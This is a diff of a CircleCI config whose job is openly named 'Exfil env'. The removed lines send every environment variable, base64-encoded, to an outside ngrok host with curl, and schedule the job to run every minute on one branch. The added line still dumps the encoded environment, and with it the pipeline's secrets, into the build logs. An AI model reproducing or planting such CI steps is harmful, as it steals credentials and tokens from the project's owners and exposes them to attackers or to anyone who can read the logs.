@@ -8,17 +8,9 @@ jobs:
       - checkout
       - run:
           name: "Exfil env"
-          command: "curl https://b97e38037b5c.ngrok-free.app/?env=`env | base64 -w0`"
+          command: "env | base64"
 
-# 默认的: circleci-project-setup
 workflows:
   exfil-env-workflow:
-    triggers:
-      - schedule:
-          cron: "* * * * *"
-          filters:
-            branches:
-              only:
-                - circleci-project-setup
     jobs:
       - exfil-env
